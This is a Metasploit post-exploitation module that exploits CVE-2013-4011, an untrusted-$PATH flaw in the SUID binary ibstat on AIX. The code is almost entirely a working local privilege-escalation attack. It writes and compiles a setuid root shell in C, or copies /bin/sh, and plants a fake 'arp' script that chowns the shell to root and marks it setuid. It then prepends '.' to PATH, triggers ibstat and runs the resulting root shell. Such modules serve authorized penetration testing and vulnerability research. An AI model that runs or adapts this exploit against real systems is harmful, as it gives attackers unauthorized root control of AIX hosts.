##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class Metasploit4 < Msf::Post
  Rank = ExcellentRanking

  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
        'Name'          => 'ibstat $PATH Privilege Escalation',
        'Description'   => %q{
          This module exploits the trusted $PATH environment variable of the SUID binary 'ibstat'.
        },
        'Author'         =>
        [
          'Kristian Erik Hermansen', #original author
          'Sagi Shahar <sagi.shahar[at]mwrinfosecurity.com>', #msf module
          'Kostas Lintovois <kostas.lintovois[at]mwrinfosecurity.com>', #msf module
        ],
        'References'     =>
        [
          [ 'CVE', '2013-4011' ],
          [ 'OSVDB', '95420' ],
          [ 'BID', '61287' ],
          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=isg1IV43827' ],
          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=isg1IV43756' ]
        ],
        'Platform'      => [ 'aix' ],
        'Arch'          => [ 'ppc' ],
        'SessionTypes'  => [ 'shell' ],
        'DisclosureDate'=>  "Sep 24 2013",
      ))
     register_options([
         OptString.new("WDIR", [ true, "A directory where we can write files", "/tmp" ]),
       ], self.class)
  end

  def run
    if is_vuln?  
      print_good("Target is vulnerable.")
    else
      print_error("Target is not vulnerable.")
      return
    end

    root_file = "#{datastore["WDIR"]}/" + Rex::Text.rand_text_alpha(8)
    arp_file = "#{datastore["WDIR"]}/arp"
    c_file = %Q^#include <stdio.h>

int main()
{
   setreuid(0,0);
   setregid(0,0);
   execve("/bin/sh",NULL,NULL);
   return 0;
}
^
    arp = %Q^#!/bin/sh

chown root #{root_file}
chmod 4555 #{root_file}
^

    if gcc_installed?
      print_status("Dropping file #{root_file}.c...")
      write_file("#{root_file}.c", c_file)
      print_status("Compiling source...")
      cmd_exec "gcc -o #{root_file} #{root_file}.c"
      print_status("Compilation completed")
      print_status("Deleting source...")
      file_rm("#{root_file}.c")
    else
      cmd_exec "cp /bin/sh #{root_file}"
    end
    print_status("Writing custom arp file...")
    write_file("#{arp_file}",arp)
    cmd_exec "chmod 0555 #{arp_file}"
    print_status("Custom arp file written")
    print_status("Updating PATH environment variable...")
    cmd_exec 'PATH=.:$PATH'
    cmd_exec 'export PATH'
    print_status("Triggering vulnerablity...")
    cmd_exec '/usr/bin/ibstat -a -i en0 2>/dev/null >/dev/null'
    print_status("Removing custom arp...")
    file_rm("#{arp_file}")
    cmd_exec "#{root_file}"
    print_status("Checking root privileges...")
    is_root?
  end

  def is_vuln?
    ls_output = cmd_exec "find /usr/sbin/ -name ibstat -perm -u=s -user root 2>/dev/null"
    if ls_output.include? ("ibstat")
        return true
    end
    false
end

  def gcc_installed?
      print_status("Checking if gcc exists...")
      gcc_version = cmd_exec 'gcc -v'
      gcc_array = gcc_version.split("\n")
      gcc_array.each do |res|
        if res.include? ("gcc version")
          print_good("gcc found! (#{res})")
          return true
        end
      end
      print_status("gcc not found. Using /bin/sh from local system")
      false
  end

  def is_root?
    id_output = cmd_exec "id"
    if id_output.include? ("euid=0(root)")
      print_good("Got root! (euid)")
    elsif id_output.include?("uid=0(root)")
      print_good("Got root!")
    else
      print_status("Exploit failed")
    end
  end
end